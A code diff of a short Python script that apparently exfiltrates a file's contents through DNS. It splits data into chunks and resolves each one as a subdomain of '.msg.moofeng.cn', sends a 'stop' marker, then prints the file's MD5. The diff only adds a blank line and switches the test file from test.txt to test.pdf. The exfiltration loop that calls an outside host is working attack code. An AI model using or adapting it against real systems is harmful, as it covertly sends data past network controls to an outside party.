@@ -4,6 +4,7 @@ from core import file2string, string2msg, file2md5
 
 
 DOMAIN = '.msg.moofeng.cn'
+
 def query(msg):
     try:
         dns.resolver.query(msg + DOMAIN, 'A', raise_on_no_answer=False)
@@ -17,5 +18,5 @@ for _ in msg:
     query(_)  
     # sleep(0.1)
 query('stop')
-md5 = file2md5('test.txt')
+md5 = file2md5('test.pdf')
 print(f"[+] MD5: {md5}")
